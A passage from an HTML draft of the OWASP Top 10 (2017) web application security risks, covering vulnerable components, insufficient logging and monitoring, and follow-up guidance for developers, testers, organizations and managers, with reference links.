<li>The objects override protected or private member fields that contain sensitive state, such as role or similar</li>
</ul>
<h2 id="how-do-i-prevent-7">How do I prevent</h2>
<ul>
<li>The only safe architectural pattern is to not send or accept serialized objects from untrusted sources</li>
</ul>
<p>If this not possible</p>
<ul>
<li>Implement integrity checks or encryption of the serialized objects to prevent hostile creation, tampering, replay and gadget calls</li>
<li>Isolate code that deserializes, such that it runs in very low privilege environments, such as temporary containers</li>
<li>Enforce type constraints over serialized objects; typically code is expecting a particular class</li>
<li>Log deserialization exceptions and failures, such as where the incoming type is not the expected type, or the deserialization throws exceptions.</li>
</ul>
<p>Larger and high performing organizations should also consider:</p>
<ul>
<li>Rate limit API or methods that deserialize</li>
<li>Restrict or monitor incoming and outgoing network connectivity from containers or servers that deserialize</li>
<li>Monitor deserialization, alerting if a user deserializes constantly.</li>
</ul>
<h2 id="references-7">References</h2>
<h3 id="owasp-7">OWASP</h3>
<ul>
<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#4:_Validate_All_Inputs">OWASP Proactive Controls - Validate All Inputs</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Home">OWASP Application Security Verification Standard - TBA</a></li>
<li><a href="https://www.owasp.org/index.php/Deserialization_Cheat_Sheet">OWASP Cheat Sheet - Deserialization</a></li>
</ul>
<h3 id="external-7">External</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/502.html">CWE-502: Deserialization of Untrusted Data</a></li>
</ul>
<h1 id="a9-using-components-with-known-vulnerabilities">A9 Using Components with Known Vulnerabilities</h1>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th>Threat agents/Attack vectors</th>
<th>Security Weakness</th>
<th>Impacts</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Access Lvl \</td>
<td>Exploitability</td>
<td>Prevalence \</td>
</tr>
<tr class="even">
<td>There are off the shelf exploits for certain platforms, but typically this issue requires authentication or access to specific platform functionality. This issue is not easily detectable. due to backported patches or hidden headers. The best place to detect this issue is using dependency checkers in the CI/CD platform.</td>
<td>This issue is widespread, with most applications and APIs containing 200-1000+ dependencies depending on platform.</td>
<td>Some of the largest breaches in history abused this risk, and so depending on the data asset under protection, this might even rise to SEVERE.</td>
</tr>
</tbody>
</table>
<h2 id="am-i-vulnerable-to-attack-8">Am I vulnerable to attack?</h2>
<p>You are likely vulnerable:</p>
<ul>
<li>If you do not know the versions of all components you use (both client-side and server-side). This includes components you directly use as well as nested dependencies.</li>
<li>If any of your software out of date? This includes the OS, Web/App Server, DBMS, applications, APIs and all components, runtime environments and libraries.</li>
<li>If you do not know if they are vulnerable. Either if you don’t research for this information or if you don’t scan them for vulnerabilities on a regular base.</li>
<li>If you do not fix nor upgrade the software. E.g. if you don’t update your software to work together with this fixes. But also if you fix severe vulnerabilities too slowly.</li>
<li>If you do not secure the components' configurations (see <a href="">A5:2017-TBD</a>).</li>
</ul>
<h2 id="how-do-i-prevent-8">How do I prevent</h2>
<p>Most component projects do not create vulnerability patches for old versions. So the only way to fix the problem is to upgrade to the next version, which can require other code changes. Software projects should have a process in place to:</p>
<ul>
<li>Continuously inventory the versions of both client-side and server-side components and their dependencies using tools like <a href="http://www.mojohaus.org/versions-maven-plugin/">versions</a>, <a href="https://www.owasp.org/index.php/OWASP_Dependency_Check">DependencyCheck</a>, <a href="https://github.com/retirejs/retire.js/">retire.js</a>, etc.</li>
<li>Continuously monitor sources like <a href="https://cve.mitre.org/">CVE</a> and <a href="https://nvd.nist.gov/">NVD</a> for vulnerabilities in your components. Use software composition analysis tools to automate the process.</li>
<li>Analyze libraries to be sure they are actually invoked at runtime before making changes, as many components are never loaded or invoked.</li>
<li>Only obtain your components from official sources and, when possible, prefer signed packages to reduce the chance of getting a modified, malicious component.</li>
<li>Most component projects do not create security patches for old versions. So you may need to upgrade to the next version (and rewrite the application to match, if needed). If this is not possible, deploy a <a href="https://www.owasp.org/index.php/Virtual_Patching_Best_Practices#What_is_a_Virtual_Patch.3F">virtual patch</a> that analyzes HTTP traffic, data flow, or code execution and prevents vulnerabilities from being exploited.</li>
</ul>
<p>Additionally, you should ensure that there is an ongoing plan for monitoring the security of components for the lifetime of the application.</p>
<h2 id="example-scenarios-7">Example Scenarios</h2>
<p>Components almost always run with the full privilege of the application, so flaws in any component can result in serious impact. Such flaws can be accidental (e.g., coding error) or intentional (e.g., backdoor in component).</p>
<p>The <a href="https://arstechnica.com/information-technology/2017/09/massive-equifax-breach-caused-by-failure-to-patch-two-month-old-bug/">2017 Equifax breach</a> was caused by <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638">CVE-2017-5638</a>, a Struts 2 remote code execution vulnerability that enables execution of arbitrary code on the server.</p>
<p>While <a href="https://en.wikipedia.org/wiki/Internet_of_things">internet of things (IoT)</a> are frequently difficult to patch, the importance of patching them can be great (eg: <a href="http://www.zdnet.com/article/fda-forces-st-jude-pacemaker-recall-to-patch-security-vulnerabilities/">St. Jude pacemakers</a>).</p>
<p>There are now tools to help attackers find unpatched systems. For example, the Shodan IoT search engine can help you <a href="https://www.shodan.io/report/89bnfUyJ">find devices</a> that still suffer from the <a href="https://en.wikipedia.org/wiki/Heartbleed">Heartbleed vulnerability</a> that was patched in April 2014.</p>
<h2 id="references-8">References</h2>
<h3 id="owasp-8">OWASP</h3>
<ul>
<li><a href="">OWASP Proactive Controls - TBA</a></li>
<li><a href="">OWASP Application Security Verification Standard - TBA</a></li>
<li><a href="">OWASP Testing Guide - TBA</a></li>
<li><a href="">OWASP Cheat Sheet - TBA</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_Dependency_Check">OWASP Dependency Check (for Java and .NET libraries)</a></li>
<li><a href="https://www.owasp.org/index.php/Virtual_Patching_Best_Practices">OWASP Virtual Patching Best Practices</a></li>
</ul>
<h3 id="external-8">External</h3>
<ul>
<li><a href="https://www.aspectsecurity.com/research-presentations/the-unfortunate-reality-of-insecure-libraries">The Unfortunate Reality of Insecure Libraries</a></li>
<li><a href="https://www.cvedetails.com/version-search.php">MITRE Common Vulnerabilities and Exposures (CVE) search</a></li>
<li><a href="https://nvd.nist.gov/">National Vulnerability Database (NVD)</a></li>
<li><a href="https://github.com/retirejs/retire.js/">Retire.js for detecting known vulnerable JavaScript libraries</a></li>
<li><a href="https://nodesecurity.io/advisories">Node Libraries Security Advisories</a></li>
<li><a href="https://rubysec.com/">Ruby Libraries Security Advisory Database and Tools</a></li>
</ul>
<h1 id="a10-insufficient-logging-and-monitoring">A10 Insufficient Logging and Monitoring</h1>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th>Threat agents/Attack vectors</th>
<th>Security Weakness</th>
<th>Impacts</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Access Lvl \</td>
<td>Exploitability</td>
<td>Prevalence \</td>
</tr>
<tr class="even">
<td>Exploitation of insufficient logging and monitoring is the bedrock of every major incident. Attackers rely on the lack of monitoring to achieve their goals without being detected. This issue is not easily detectable. Generally, dynamic testing would detect active response, such as being blocked. This is often not visible to tools.</td>
<td>There is little data on the prevalence of this issue, and so this issue has been selected by the community.</td>
<td>The impact of this issue is moderate to severe, due to delays in activating incident response, allowing the attacker more time to attack, and impairs understanding of what was disclosed or breached.</td>
</tr>
</tbody>
</table>
<h2 id="am-i-vulnerable-to-attack-9">Am I vulnerable to attack?</h2>
<p>Insufficient logging and monitoring occurs anytime:</p>
<ul>
<li>Auditable events, such as logins, failed logins, and high value transactions are not logged</li>
<li>Logs are not monitored for suspicious activity</li>
<li>Alerting or escalation as per the risk of the data held by the application is not in place or effective.</li>
</ul>
<h2 id="how-do-i-prevent-9">How do I prevent</h2>
<p>As per the risk of the data stored or processed by the application:</p>
<ul>
<li>Ensure all login and high value transactions can be logged</li>
<li>Ensure sensitive and private information is not logged, or masked or truncated as per privacy laws and regulations</li>
<li>Ensure stack traces and detailed errors are not sent to the screen, but to logs</li>
<li>Ensure logs cannot easily be deleted or cleared without authorization</li>
<li>Establish effective monitoring and alerting, such that suspicious activities such as brute force attacks or business loss are detected and responded within acceptable time periods.</li>
</ul>
<p>Large or high performing organizations should have application security incident response plans in place, and tested across web apps and API services, with tooling integrated into processes, people and training. Such organizations may wish to invest in log correlation and analysis or security event incident management (SIEM) software or services. Open source and commercial offerings should be considered in light of organizational objectives and budget.</p>
<h2 id="example-scenarios-8">Example Scenarios</h2>
<p>Target, a large US retailer, had an internal malware analysis sandbox analyzing attachments. The sandbox software had detected potentially unwanted software, but no one responded to this detection. By the time the point of sale breach was discovered, the sandbox had been alerting on this issue for over six months. Since this time, Target has invested heavily in security operations, including training, and network and application oversight.</p>
<p>An open source project forum software run by a small team was hacked using a flaw in its software. The attackers managed to wipe out the internal source code repository containing the next version, and all of the forum contents. Although source could be recovered, the lack of monitoring, logging or alerting led to a far worse breach. The forum software project is no longer active as a result of this issue.</p>
<h2 id="references-9">References</h2>
<h3 id="owasp-9">OWASP</h3>
<ul>
<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#8:_Implement_Logging_and_Intrusion_Detection">OWASP Proactive Controls - Implement Logging and Intrusion Detection</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Home">OWASP Application Security Verification Standard - V7 Logging and Monitoring</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Home">OWASP Testing Guide - Testing for Detailed Error Code</a></li>
<li><a href="https://www.owasp.org/index.php/Logging_Cheat_Sheet">OWASP Cheat Sheet - Logging</a></li>
</ul>
<h3 id="external-9">External</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/223.html">CWE-223: Omission of Security-relevant Information</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/778.html">CWE-778: Insufficient Logging</a></li>
</ul>
<h2 id="d-whats-next-for-developers">+D What's Next for Developers</h2>
<h3 id="establish-use-repeatable-security-processes-and-standard-security-controls">Establish &amp; Use Repeatable Security Processes and Standard Security Controls</h3>
<p>Whether you are new to web application security or are already very familiar with these risks, the task of producing a secure web application or fixing an existing one can be difficult. If you have to manage a large application portfolio, this task can be daunting.</p>
<p>To help organizations and developers reduce their application security risks in a cost effective manner, OWASP has produced numerous free and open resources that you can use to address application security in your organization. The following are some of the many resources OWASP has produced to help organizations produce secure web applications and APIs. On the next page, we present additional OWASP resources that can assist organizations in verifying the security of their applications and APIs.</p>
<table style="width:11%;">
<colgroup>
<col style="width: 5%" />
<col style="width: 5%" />
</colgroup>
<thead>
<tr class="header">
<th>Activity</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Application Security Requirements</td>
<td>To produce a secure web application, you must define what secure means for that application. OWASP recommends you use the <a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project">OWASP Application Security Verification Standard (ASVS)</a>, as a guide for setting the security requirements for your application(s). ASVS has been updated significantly in the past few years, with version 3.0.1 being released mid 2016. If you’re outsourcing, consider the <a href="https://www.owasp.org/index.php/OWASP_Secure_Software_Contract_Annex">OWASP Secure Software Contract Annex</a>.</td>
</tr>
<tr class="even">
<td>Application Security Architecture</td>
<td>Rather than retrofitting security into your applications and APIs, it is far more cost effective to design the security in from the start. OWASP recommends the <a href="https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series">OWASP Prevention Cheat Sheets</a> and the as good starting points for guidance on how to design security in from the beginning. The Cheat Sheets have been updated and expanded significantly since the 2013 Top 10 was released.</td>
</tr>
<tr class="odd">
<td>Security Standard Controls</td>
<td>Building strong and usable security controls is difficult. Using a set of standard security controls radically simplifies the development of secure applications and APIs. Many popular frameworks come with standard security controls for authorization, validation, CSRF, etc.</td>
</tr>
<tr class="even">
<td>Secure Development Lifecycle</td>
<td>To improve the process your organization follows when building applications and APIs, OWASP recommends the <a href="https://www.owasp.org/index.php/OWASP_SAMM_Project">OWASP Software Assurance Maturity Model (SAMM)</a>. This model helps organizations formulate and implement a strategy for software security that is tailored to the specific risks facing their organization. A significant update to Open SAMM was released in 2017.</td>
</tr>
<tr class="odd">
<td>Application Security Education</td>
<td>The <a href="https://www.owasp.org/index.php/Category:OWASP_Education_Project">OWASP Education Project</a> provides training materials to help educate developers on web application security. For hands-on learning about vulnerabilities, try <a href="https://www.owasp.org/index.php/WebGoat">OWASP WebGoat</a>, <a href="https://www.owasp.org/index.php/Category:OWASP_WebGoat.NET">WebGoat.NET</a>, <a href="https://www.owasp.org/index.php/OWASP_Node_js_Goat_Project">OWASP NodeJS Goat</a>), or the <a href="https://www.owasp.org/index.php/OWASP_Broken_Web_Applications_Project">OWASP Broken Web Applications Project</a>. To stay current, come to an <a href="https://www.owasp.org/index.php/Category:OWASP_AppSec_Conference">OWASP AppSec Conference</a>, <a href="TBA">OWASP Conference Training</a>, or local <a href="https://www.owasp.org/index.php/Category:OWASP_Chapter">OWASP Chapter meetings</a>.</td>
</tr>
</tbody>
</table>
<p>There are numerous additional OWASP resources available for your use. Please visit the <a href="https://www.owasp.org/index.php/Projects">OWASP Projects</a> page, which lists all the Flagship, Labs, and Incubator projects in the OWASP project inventory. Most OWASP resources are available on our <a href="https://www.owasp.org/">wiki</a>, and many OWASP documents can be ordered in <a href="https://stores.lulu.com/owasp">hardcopy or as eBooks</a>.</p>
<h1 id="t-whats-next-for-security-testing">+T What's Next for Security Testing</h1>
<h2 id="establish-continuous-application-security-testing">Establish Continuous Application Security Testing</h2>
<p>Building code securely is important. But it's critical to verify that the security you intended to build is actually present, correctly implemented, and used everywhere it was supposed to be. The goal of application security testing is to provide this evidence. The work is difficult and complex, and modern high-speed development processes like Agile and DevOps have put extreme pressure on traditional approaches and tools. So we strongly encourage you to put some thought into how you are going to focus on what's important across your entire application portfolio, and do it cost-effectively.</p>
<p>Modern risks move quickly, so the days of scanning or penetration testing an application for vulnerabilities once every year or so are long gone. Modern software development requires continuous application security testing across the entire software development lifecycle. Look to enhance existing development pipelines with security automation that doesn't slow development. Whatever approach you choose, consider the annual cost to test, triage, remediate, retest, and redeploy a single application, multiplied by the size of your application portfolio.</p>
<table style="width:11%;">
<colgroup>
<col style="width: 5%" />
<col style="width: 5%" />
</colgroup>
<thead>
<tr class="header">
<th>Activity</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Understand the Threat Model</td>
<td>Before you start testing, be sure you understand what's important to spend time on. Priorities come from the threat model, so if you don't have one, you need to create one before testing. Consider using OWASP ASVS and the OWASP Testing Guide as an input and don't rely on tool vendors to decide what's important for your business.</td>
</tr>
<tr class="even">
<td>Understand Your SDLC</td>
<td>Your approach to application security testing must be highly compatible with the people, processes, and tools you use in your software development lifecycle (SDLC). Attempts to force extra steps, gates, and reviews are likely to cause friction, get bypassed, and struggle to scale. Look for natural opportunities to gather security information and feed it back into your process.</td>
</tr>
<tr class="odd">
<td>Testing Strategies</td>
<td>Choose the simplest, fastest, most accurate technique to verify each requirement. Be sure to consider the human resources required to deal with false positives as well as the serious dangers of false negatives.</td>
</tr>
<tr class="even">
<td>Achieving Coverage and Accuracy</td>
<td>You don't have to start out testing everything. Focus on what's important and expand your verification program over time. That means expanding the set of security defenses and risks that are being automatically verified, as well as expanding the set of applications and APIs being covered. The goal is to get to where the essential security of all your applications and APIs is verified continuously.</td>
</tr>
<tr class="odd">
<td>Making Findings Awesome</td>
<td>No matter how good you are at testing, it won't make any difference unless you communicate it effectively. Build trust by showing you understand how the application works. Describe clearly how it can be abused without &quot;lingo&quot; and include an attack scenario to make it real. Make a realistic estimation of how hard the vulnerability is to discover and exploit, and how bad that would be. Finally, deliver findings in the tools development teams are already using, not PDF files.</td>
</tr>
</tbody>
</table>
<h1 id="o-whats-next-for-organizations">+O What's Next for Organizations</h1>
<h2 id="start-your-application-security-program-now">Start Your Application Security Program Now</h2>
<p>Application security is no longer optional. Between increasing attacks and regulatory pressures, organizations must establish effective processes and capabilities for securing their applications and APIs. Given the staggering amount of code in the numerous applications and APIs already in production, many organizations are struggling to get a handle on the enormous volume of vulnerabilities.</p>
<p>OWASP recommends that organizations establish an application security program to gain insight and improve security across their application portfolio. This should include vendor application security testing governance, policies, verification and deployment, such that leading or organizations who use any combination of internal, managed security service providers, or out-tasked vendor security testing, can directly compare results from multiple vendors by using agreed metrics, test plans, risk management frameworks, and so on.</p>
<p>Achieving application security requires many different parts of an organization to work together efficiently, including security and audit, software development, and business and executive management. It requires security to be visible, so that all the different players can see and understand the organization's application security posture. It also requires focus on the activities and outcomes that actually help improve enterprise security by reducing risk in the most cost effective manner.</p>
<p>Some of the key activities in effective application security programs include:</p>
<h3 id="get-started">Get Started</h3>
<ul>
<li>Establish an application security program and drive adoption.</li>
<li>Conduct a capability gap analysis comparing your organization to your peers to define key improvement areas and an execution plan.</li>
<li>Gain management approval and establish an application security awareness campaign for the entire IT organization.</li>
<li>Document all your IT assets (e.g. applications) in a Configuration Management Database (CMDB).</li>
</ul>
<h3 id="risk-based-portfolio-approach">Risk Based Portfolio Approach</h3>
<ul>
<li>Identify the protection needs of your application portfolio from a business and regulatory perspective. Add the results to your CMDB.</li>
<li>Establish a common risk rating model with a consistent set of likelihood and impact factors reflective of your organization's tolerance for risk.</li>
<li>Accordingly measure and prioritize all your applications and APIs. Add the results to your CMDB.</li>
<li>Establish assurance guidelines to properly define coverage and level of rigor required.</li>
</ul>
<h3 id="enable-with-a-strong-foundation">Enable with a Strong Foundation</h3>
<ul>
<li>Establish a set of focused policies and minimum standards that outsourced development or custom development partners must demonstrate in your software supply chain.</li>
<li>Establish a set of focused policies and standards that provide an application security baseline for all development teams.</li>
<li>Define a common set of reusable security controls that complement these policies and standards and provide design and development guidance on their use.</li>
<li>Establish an application security training curriculum that is required and targeted to different development roles and topics.</li>
</ul>
<h3 id="integrate-security-into-existing-processes">Integrate Security into Existing Processes</h3>
<ul>
<li>Define and integrate secure implementation and verification activities into existing development and operational processes. Activities include threat modeling, secure design &amp; review, secure coding &amp; code review, penetration testing and remediation.</li>
<li>Provide subject matter experts and support services for development and project teams to be successful.</li>
</ul>
<h3 id="provide-management-visibility">Provide Management Visibility</h3>
<ul>
<li>Manage with metrics. Drive improvement and funding decisions based on the metrics and analysis data captured. Metrics include adherence to security practices / activities, vulnerabilities introduced, vulnerabilities mitigated, application coverage, defect density by type and instance counts, etc.</li>
<li>Analyze data from the implementation and verification activities to look for root cause and vulnerability patterns to drive strategic and systemic improvements across the enterprise. Learn from mistakes and offer positive incentives to promote improvements.</li>
</ul>
<h3 id="examples-of-such-programs">Examples of such programs</h3>
<ul>
<li>US Department of Veteran's Affairs <a href="https://wiki.mobilehealth.va.gov/display/OISSWA/OIS+Software+Assurance">OIS Software Assurance</a></li>
</ul>
<h1 id="am-whats-next-for-managers">+AM What's next for managers</h1>
<h2 id="appsec-program">AppSec Program</h2>
<p>Application Security is not the Dark Arts, it's a highly repeatable facet of software engineering. The primary aim of any CISO or application owner is to reduce the risks to the organization by addressing the most important issues in a highly repeatable, business as usual fashion.</p>
<p>To that end, we suggest:</p>
<ul>
<li><p>Consider reviewing your application security program against the <a href="https://www.owasp.org/index.php/OWASP_SAMM_Project">OWASP SAMM</a> project. This project has 12 major domains, each of which can assist with maturing any appsec program, regardless of size</p></li>
<li><p>Move left; by this we mean the old days of performing a penetration test just before (or usually after) you go live is not particularly effective if that's the entireity of your application security program. Implement security into your agile SDLC, and ensure security is just another team member that helps to enable secure business.</p></li>
<li><p>Ensure you have an effective data asset list, so you can ensure that all applications have appropriate controls, risk management and safeguards. The growth of software as a service places special burdens on organizations, as often the data is outside the traditional security boundary, and yet you cannot outsource responsibility for issues such as privacy or compliance. With the EU GDPR and other regulations containing significant penalties for mishandling data, it's more critical than ever to understand where your data is, and the controls over it.</p></li>
<li><p>Training and investing in your people. Security is not a technology issue; it's a people problem. Make sure your staff and contractors are aware of their obligations to produce secure software, rather than rely on a small non-scalable team. This may mean providing &quot;secure development&quot; training or similar for developers and architects. Penetration testing training would be best suited for quality assurance, rather than development staff.</p></li>
<li><p>Managing application security must cover all phases of the SDLC, from ensuring adequate resourcing, business requirements and limits, ensuring that development teams are continuously improving, ensuring that testing verifies all of the security activities to that point, build covers off simple things like ensuring the build breaks if outdated or vulnerable components are found, and there is adequate monitoring, escalation and incident response management in place.</p></li>
</ul>
<h2 id="metrics">Metrics</h2>
<p>A key issue is how do you measure the reduction in risk, year on year, especially if you are just starting out on an app sec program, or engaging in new ways of testing applications and APIs.</p>
<p>Some metrics to get you going include:</p>
<ul>
<li>How many defects are currently known per application?</li>
<li>Does this indicate security technical debt or training requirements?</li>
<li>Does this indicate the need to upgrade or replace certain platforms?</li>
<li>How many critical, high and medium risks have been resolved over time?</li>
<li>How much does a security defect cost to resolve? This helps provide the investment case for training, retiring known technical debt, and helping the business surface the true costs of going live with unknown risk</li>
<li>How effective are your testing partners in reducing your risk? Do they help find impactful issues? Could they be better used in some way?</li>
<li>How many apps have never been tested? Do they contain any sensitive data assets?</li>
<li>Tracking if testing is overdue or required for regulatory compliance reasons, such as PCI ASV scans or privacy impact assessments</li>
</ul>
<p>There are many forms of metrics that can be found. Be careful of metrics that don't align business and security, but instead aim to reduce costs - such as cost per bug. At a certain point, KPIs need to be aligned with enabling secure business, not cost reductions.</p>
<h2 id="this-is-just-the-start">This is just the start</h2>
<p>Starting the application security journey can feel overwhelming. A key takeaway is that you can't review your way to building a bridge; at some point you must build it. Let's ensure that security is deeply esconced within the organization, and aligned with organizational objectives.</p>
<h1 id="a-whats-next-for-application-managers">+A: What's next for Application Managers</h1>
<h2 id="manage-the-full-application-lifecycle">Manage the full Application Lifecycle</h2>
<p>Applications are some of the most complex systems humans regularly create and maintain. IT management for an application should be performed by IT specialists who are responsible for the overall IT lifecycle of an application.</p>
<p>We suggest establishing application managers and or application owners for every application. The application manager is the technical counterpart of the application owner from business perspective and manages the full application lifecycle, including the security of an application, associate data assets, and documentation. Application managers work together with the organization's security specialists.</p>
<h2 id="requirements-and-resource-management">Requirements and Resource Management</h2>
<ul>
<li>Collect and negotiate the business requirements for an application with the business, including receiving the protection requirements in regard to confidentiality, integrity and availability of all data assets</li>
<li>Compile the technical requirements including functional and non functional security requirements</li>
<li>Plan and negotiate the budget that covers all aspects of design, build, testing and operation, including security activities</li>
</ul>
<h2 id="request-for-proposals-rfp-and-contracting">Request for Proposals (RFP) and Contracting</h2>
<ul>
<li>Negotiate with internal or external developers the requirements, including guidelines and security requirements with respect to your security program, e.g. SDLC, best practices</li>
<li>Rate the fulfillment of all technical requirements including a rough planning and design</li>
<li>Negotiate all technical requirements including design, security and service level agreements (SLA)</li>
<li>Consider to use templates and checklists, such as <a href="https://www.owasp.org/index.php/OWASP_Secure_Software_Contract_Annex">OWASP Secure Software Contract Annex</a>.</li>
</ul>
<p><strong>NB:</strong> Please note that the Annex is a sample specific to US contract law, and is likely to need legal review in your jurisdiction. Please consult qualified legal advice before using the Annex.</p>
<h2 id="planning-and-design">Planning and Design</h2>
<ul>
<li>Negotiate planning and design with the developers and internal shareholders, e.g. security specialists</li>
<li>Compile a security concept (e.g. architecture, measures) according the protection needs and the planned environmental security level. This should be supported by security specialists. Get the application owner to assume remaining risks or to provide additional resources.</li>
<li>Plan the quality gates for the development including security gates</li>
</ul>
<h2 id="development">Development</h2>
<p>Please review the +D &quot;What's next for developers&quot; for guidance.</p>
<h2 id="deployment-testing-and-rollout">Deployment, Testing and Rollout</h2>
<ul>
<li>It's critical that security tasks automated the secure setup of the application, interfaces and of all further components needed, including required authorizations</li>
<li>Test the technical functions and integration to the IT architecture, coordinate business tests. Consider to test use and abuse cases from technical and business perspectives.</li>
<li>Manage security tests according to internal processes, the protection needs and the level of security where the application is going to be</li>
<li>Put the application in operation and migrate form previously used applications</li>
<li>Finalize all documentation, including the CMDB and security architecture.</li>
</ul>
<h2 id="operating-and-changes">Operating and Changes</h2>
<ul>
<li>Operating including the security management for the application (e.g. patch management)</li>
<li>Regularly report all users and authorizations to the application owner and get them acknowledged</li>
<li>Raise the security awareness of users and manage conflicts about usability vs security</li>
<li>Plan and manage changes, e.g. migrate to new versions of the application or other components like OS, middleware and libraries</li>
<li>Update all documentation, including in CMDB and the security concept.</li>
</ul>
<h2 id="retiring-systems">Retiring systems</h2>
<ul>
<li>Regard any requirements for archiving data</li>
<li>Securely close down the application, incl. delete unused accounts and authorization</li>
<li>Set your application’s state to retired in the CMDB</li>
</ul>
<h1 id="references-10">References</h1>
<h2 id="owasp-flagship-projects-documents">OWASP Flagship Projects (Documents)</h2>
<p>The following OWASP Flagship documentation projects are most likely to be useful to users/adopters of this standard:</p>
<ul>
<li><a href="https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series">OWASP Cheat Sheets</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls">OWASP Proactive Controls</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project">OWASP Application Security Verification Standard</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_Testing_Project">OWASP Testing Guide</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_Top_10_Privacy_Risks_Project">OWASP Privacy Top 10 Risks</a></li>
<li><a href="https://www.owasp.org/index.php/Projects/OWASP_Mobile_Security_Project_-_Top_Ten_Mobile_Risks">OWASP Mobile Top 10 Risks</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_SAMM_Project">OWASP SAMM</a></li>
</ul>
<h2 id="owasp-flagship-projects-tools">OWASP Flagship Projects (Tools)</h2>
<p>The following projects are highly likely to be useful to adopters of the OWASP Top 10:</p>
<ul>
<li><a href="https://www.owasp.org/index.php/OWASP_AppSensor_Project">OWASP AppSensor</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_Dependency_Check">OWASP Dependency Check</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project">OWASP mod_security WAF Core Rule Set</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_OWTF">OWASP Open Web Testing Framework</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">OWASP ZAP</a></li>
</ul>
<h2 id="owasp-lab-projects">OWASP Lab Projects</h2>
<p>These projects are working towards Flagship status, and might well achieve it before 2020.</p>
<ul>
<li><a href="https://www.owasp.org/index.php/OWASP_Guide_Project">OWASP Developer Guide</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_Juice_Shop_Project">OWASP Juice Shop</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_Secure_Software_Contract_Annex">OWASP Secure Contract Annex</a></li>
</ul>
<p>For a full list of projects, please see <a href="https://www.owasp.org/index.php/Category:OWASP_Project">OWASP Projects</a></p>
<h2 id="external-references">External references</h2>
<p>The following external sites reference the OWASP Top 10, and would likely be relevant to adopters.</p>
<ul>
<li><a href="https://cwe.mitre.org/">MITRE Common Weakness Enumeration</a></li>
<li><a href="https://www.pcisecuritystandards.org">PCI Security Standards Council</a></li>
<li><a href="https://www.pcisecuritystandards.org/document_library">PCI Data Security Standard (DSS)</a></li>
</ul>
</body>
</html>
